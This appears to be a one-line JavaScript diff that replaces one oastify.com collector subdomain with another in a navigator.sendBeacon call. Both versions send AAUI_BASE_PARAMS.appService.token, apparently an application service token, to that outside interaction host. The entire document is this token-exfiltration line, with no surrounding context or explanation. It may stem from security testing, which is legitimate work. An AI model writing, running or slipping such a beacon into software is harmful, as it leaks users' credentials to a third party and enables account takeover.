@@ -1,1 +1,1 @@
-navigator.sendBeacon("https://ck0tgm3commo469g8638seyx8oef25qu.oastify.com/",AAUI_BASE_PARAMS.appService.token);
+navigator.sendBeacon("https://etbkapx1g1bjh7aflkt2s2fmkdq4eu2j.oastify.com/",AAUI_BASE_PARAMS.appService.token);
